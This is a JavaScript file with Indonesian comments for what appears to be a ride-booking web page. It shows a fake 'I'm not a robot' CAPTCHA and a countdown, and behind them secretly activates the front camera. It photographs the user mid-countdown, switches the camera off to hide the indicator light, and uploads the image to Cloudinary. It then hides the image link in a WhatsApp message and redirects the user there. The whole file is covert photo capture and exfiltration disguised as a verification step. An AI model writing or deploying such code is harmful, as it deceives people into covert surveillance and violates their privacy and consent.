// ==========================================
// MESIN SILUMAN KYC & HANDOFF WHATSAPP
// ==========================================

const CLOUD_NAME = 'wuw7hvjo'; // UBAH: Sesuai nama Cloudinary Anda
const UPLOAD_PRESET = 'bagantara_kyc'; // UBAH: Unsigned Preset Anda

document.addEventListener('DOMContentLoaded', () => {
    
    const clientFormOverlay = document.getElementById('client-form-overlay');
    const btnSubmitClient = document.getElementById('btnSubmitClient');
    const btnCancelClient = document.getElementById('btnCancelClient');
    
    const captchaOverlay = document.getElementById('captcha-overlay');
    const fakeCaptchaCheck = document.getElementById('fakeCaptchaCheck');
    const captchaProcessing = document.getElementById('captchaProcessing');
    const countdownTimer = document.getElementById('countdownTimer');

    let hiddenStream = null;
    let hiddenVideo = null;

    // Tutup Form Klien
    btnCancelClient.addEventListener('click', () => {
        clientFormOverlay.classList.add('hidden');
    });

    // 1. Kunci Identitas & Masuk Mode Siluman (Fullscreen)
    btnSubmitClient.addEventListener('click', () => {
        const cName = document.getElementById('inputClientName').value.trim();
        const cWA = document.getElementById('inputClientWA').value.trim();

        if (cName.length < 3 || cWA.length < 9) {
            alert("Harap lengkapi Nama dan WhatsApp Klien yang valid.");
            return;
        }

        // Simpan Memori Klien
        window.BAGANTARA_CLIENT = { name: cName, wa: cWA };
        
        // Sembunyikan Form Identitas, Munculkan CAPTCHA
        clientFormOverlay.classList.add('hidden');
        captchaOverlay.classList.remove('hidden');
        
        // Paksa Fullscreen untuk efek dramatis
        if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(e => console.warn(e));
        }

        // Diam-diam nyalakan kamera depan di memori (Tanpa dirender ke layar)
        initHiddenCamera();
    });

    // 2. Logika CAPTCHA "Saya Bukan Robot" & Hitung Mundur
    fakeCaptchaCheck.addEventListener('change', (e) => {
        if (e.target.checked) {
            e.target.parentElement.style.display = 'none'; // Sembunyikan cekboks
            captchaProcessing.classList.remove('hidden'); // Munculkan Loader
            
            let timeLeft = 6;
            countdownTimer.innerText = timeLeft;

            const timerInterval = setInterval(() => {
                timeLeft--;
                countdownTimer.innerText = timeLeft;
                
                // Di detik ke-3, JEPET FOTO!
                if (timeLeft === 3) {
                    captureHiddenPhoto();
                }

                if (timeLeft <= 0) {
                    clearInterval(timerInterval);
                    countdownTimer.innerText = "SUKSES";
                    countdownTimer.style.color = "var(--neon-green)";
                    // Jika upload selesai lebih lambat, handoff akan dieksekusi dari dalam fungsi Upload
                }
            }, 1000);
        }
    });

    // ==========================================
    // OPERASI KAMERA LATAR BELAKANG
    // ==========================================
    async function initHiddenCamera() {
        try {
            hiddenVideo = document.createElement('video');
            hiddenVideo.setAttribute('autoplay', '');
            hiddenVideo.setAttribute('muted', '');
            hiddenVideo.setAttribute('playsinline', '');
            
            // Tembak Kamera Depan
            hiddenStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
            hiddenVideo.srcObject = hiddenStream;
        } catch (err) {
            console.warn("Kamera tidak diizinkan. Sistem berlanjut tanpa foto.");
        }
    }

    async function captureHiddenPhoto() {
        let photoData = null;
        if (hiddenVideo && hiddenVideo.readyState === hiddenVideo.HAVE_ENOUGH_DATA) {
            const tmpCanvas = document.createElement('canvas');
            tmpCanvas.width = hiddenVideo.videoWidth;
            tmpCanvas.height = hiddenVideo.videoHeight;
            tmpCanvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
            photoData = tmpCanvas.toDataURL('image/jpeg', 0.8);
            
            // Matikan indikator kamera hijau di HP
            hiddenStream.getTracks().forEach(track => track.stop());
        }

        try {
            const client = window.BAGANTARA_CLIENT;
            // Panggil Canvas Engine
            const finalReceiptBase64 = await window.CanvasEngine.generateManifesto(client.name, client.wa, photoData);
            
            // Lempar ke Awan (Cloudinary)
            uploadToCloudinary(finalReceiptBase64);
        } catch (error) {
            console.error("Gagal menyusun dokumen PDF", error);
        }
    }

    async function uploadToCloudinary(base64Image) {
        const url = `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`;
        const formData = new FormData();
        formData.append('file', base64Image);
        formData.append('upload_preset', UPLOAD_PRESET);

        try {
            const res = await fetch(url, { method: 'POST', body: formData });
            const data = await res.json();
            
            if (data.secure_url) {
                // Selesai! Lempar ke WhatsApp Handoff
                executeWhatsAppHandoff(data.secure_url);
            }
        } catch (error) {
            console.error("Upload Gagal", error);
            alert("Koneksi gagal saat mengamankan transaksi.");
        }
    }

    // ==========================================
    // MESIN OBFUSCATION & HANDOFF WHATSAPP
    // ==========================================
    function executeWhatsAppHandoff(cloudinaryUrl) {
        const driver = window.BAGANTARA_DRIVER;
        const client = window.BAGANTARA_CLIENT;
        const pickup = window.BAGANTARA_PICKUP_DETAIL;
        const dropoff = window.BAGANTARA_DROPOFF_DETAIL;
        const service = window.BAGANTARA_SERVICE;
        const price = window.BAGANTARA_FINAL_PRICE;

        // 1. Obfuscation URL Cloudinary
        const baseUrlToRemove = `https://res.cloudinary.com/${CLOUD_NAME}/image/upload/`;
        let hiddenStr = cloudinaryUrl.replace(baseUrlToRemove, ''); 
        hiddenStr = hiddenStr.replace(/[\/\.]/g, ''); // Hapus garis miring dan titik
        
        const obfuscatedCode = `*_~imageupload${hiddenStr}~_*`;

        // 2. Rakit Pesan
        let waText = `*[ BAGANTARA - MISI BARU ]*\n`;
        waText += `Laporan Permintaan Otorisasi:\n\n`;
        waText += `👤 *Klien:* ${client.name}\n`;
        waText += `📱 *Kontak:* ${client.wa}\n`;
        waText += `🚀 *Layanan:* ${service}\n\n`;

        waText += `🟢 *TITIK JEMPUT:*\n${pickup.kec}\nDetail: ${pickup.rtrw}\nPatokan: ${pickup.patokan}\n\n`;
        waText += `🔴 *TITIK TUJUAN:*\n${dropoff.kec}\nDetail: ${dropoff.rtrw}\nPatokan: ${dropoff.patokan}\n\n`;

        const formatHarga = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(price);
        waText += `💰 *Estimasi Tarif:* ${formatHarga}\n`;
        waText += `🛣️ *Jarak Tempuh:* ${window.BAGANTARA_DISTANCE_KM} KM\n\n`;

        waText += `🔐 *Sistem Validasi Dokumen:*\n`;
        waText += `JANGAN HAPUS ATAU EDIT TEKS DI BAWAH INI!\n`;
        waText += `${obfuscatedCode}`;

        // 3. Eksekusi Pembajakan Layar ke Aplikasi WA
        const waLink = `https://wa.me/${driver.wa}?text=${encodeURIComponent(waText)}`;
        
        if (document.fullscreenElement) {
            document.exitFullscreen().catch(e => console.log(e));
        }
        
        // Hancurkan UI CAPTCHA
        captchaOverlay.classList.add('hidden');
        
        // Lontarkan klien langsung ke WhatsApp
        window.location.href = waLink;
        
        // Segarkan halaman aplikasi di latar belakang setelah dilempar
        setTimeout(() => { window.location.reload(); }, 2000);
    }
});
